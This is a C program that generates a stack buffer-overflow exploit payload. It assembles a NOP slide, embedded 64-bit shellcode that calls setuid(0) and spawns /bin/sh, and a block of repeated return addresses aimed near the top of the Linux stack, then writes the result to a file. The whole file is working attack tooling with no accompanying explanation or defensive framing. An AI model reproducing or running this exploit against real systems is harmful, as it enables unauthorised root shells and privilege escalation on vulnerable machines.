#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

//Constants for payload construction
#define SHELLCODE_SIZE 48         // Size of the embedded 64-bit shellcode
#define NOP 0x90                  // NOP instruction (used for NOP slide)

//Shellcode to spawn a /bin/sh shell (64-bit)
char shellcode[] = 
    "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
    "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
    "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
    "\x58\x0f\x05";

int main(int argc, char *argv[]) {
    char *buffer, *ptr;
    unsigned long long **addr_ptr, *target_addr;
    unsigned long nop_size, addr_block_count, shellcode_size, total_size, offset;
    int i, fd;

    if (argc != 4) {
        fprintf(stderr, "Usage: %s <NOP slide size> <address block count> <offset>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    //Parse command-line arguments
    nop_size = strtoul(argv[1], NULL, 0);
    addr_block_count = strtoul(argv[2], NULL, 0);
    offset = strtoul(argv[3], NULL, 0);

    shellcode_size = SHELLCODE_SIZE;

    /**
    Base stack address to start from (approximate high stack address on 64-bit Linux),
    typically in the 0x00007ffffffff000 range depending on system and ASLR
    **/
    target_addr = (unsigned long long *)0x00007ffffffff000;

    //Apply offset to get the effective target address
    target_addr = (unsigned long long *)((unsigned long long)target_addr - offset);

    //Payload info
    printf("Payload Structure\n");
    printf("    NOP Slide Size:                  %lu\n", nop_size);
    printf("    Shellcode Size:                  %lu\n", shellcode_size);
    printf("    Number of Addresses in Block:    %lu\n", addr_block_count);
    printf("    Target Address:                  %p\n", (void *)target_addr);

    //Calculate total buffer size: NOPs + shellcode + repeated target addresses
    total_size = nop_size + shellcode_size + 8 * addr_block_count;

    //Allocate space for the full payload buffer
    if (!(buffer = malloc(total_size + 1))) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    //Create NOP slide
    for (i = 0; i < nop_size; i++) {
        buffer[i] = NOP;
    }

    //Copy shellcode after the NOP slide
    ptr = buffer + nop_size;
    for (i = 0; i < shellcode_size; i++) {
        *(ptr++) = shellcode[i];
    }

    //Fill address block with repeated target address
    addr_ptr = (unsigned long long **)(buffer + nop_size + shellcode_size);
    while ((char *)addr_ptr < buffer + total_size) {
        *(addr_ptr++) = target_addr;
    }

    //Null terminate the buffer
    buffer[total_size] = '\0';

    //Write the payload to a file named "payload"
    if ((fd = open("payload", O_WRONLY | O_CREAT | O_TRUNC, 0600)) < 0) {
        perror("open");
        exit(EXIT_FAILURE);
    }

    write(fd, buffer, total_size + 1);
    close(fd);

    printf("Payload written to file: payload\n");

    return 0;
}
